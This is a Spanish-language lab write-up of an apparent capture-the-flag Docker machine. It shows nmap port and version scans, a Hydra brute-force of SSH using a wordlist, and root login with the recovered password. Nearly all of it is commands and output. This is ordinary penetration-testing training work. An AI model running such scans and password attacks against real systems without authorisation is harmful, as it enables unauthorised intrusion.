1) **Reconocimiento**
Para empezar veo si la maquina esta activa enviando un ping a la maquina victima.
```
ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.148 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.148/0.148/0.148/0.000 ms
```
2) **Escaneo**
Al ver que la maquina esta activa realizo un escaneo en busca de puertos abiertos
```
nmap -p- --open --min-rate 5000 -sS -n -Pn 172.17.0.2 -oG escaneo
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-08 16:18 -0400
Nmap scan report for 172.17.0.2
Host is up (0.000012s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 02:42:AC:11:00:02 (Unknown)
```
Al ver que solo el puerto 22 solo se encuentra abierto realizo otro escaneo en busca de versiones de servicio y posibles scripts de vulnerabilidades
```
nmap -p22 -sCV 172.17.0.2 -oN puertos
PORT   STATE SERVICE VERSION
   6   │ 22/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)
   7   │ | ssh-hostkey: 
   8   │ |   2048 1a:cb:5e:a3:3d:d1:da:c0:ed:2a:61:7f:73:79:46:ce (RSA)
   9   │ |   256 54:9e:53:23:57:fc:60:1e:c0:41:cb:f3:85:32:01:fc (ECDSA)
  10   │ |_  256 4b:15:7e:7b:b3:07:54:3d:74:ad:e0:94:78:0c:94:93 (ED25519)
  11   │ MAC Address: 02:42:AC:11:00:02 (Unknown)
```
Al buscar vulnerabilidades para la version encuentro que es vulnerable a enumeracion de usuario.
3) **Explotacion**
Para poder buscar posibles usuarios me creo un lista con posibles usuarios 
```
nano users.txt
   1   │ root
   2   │ admin
   3   │ user
   4   │ test
   5   │ docker
   6   │ ssh
```
Una ves que tengo la lista, realizo busqueda con hydra
```
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t4 ssh//172.17.0.2
```
Al realizar la busqueda encuentro que el usuario **root** y la contrasena **estrella** son validos, los utilizo para podes ingresar a travez de ssh
```
ssh root@172.17.0.2
pass: estrella
```
Puedo ingresar como el usuario **root**
```
root@796c7be0e129:~# id
uid=0(root) gid=0(root) groups=0(root)
```
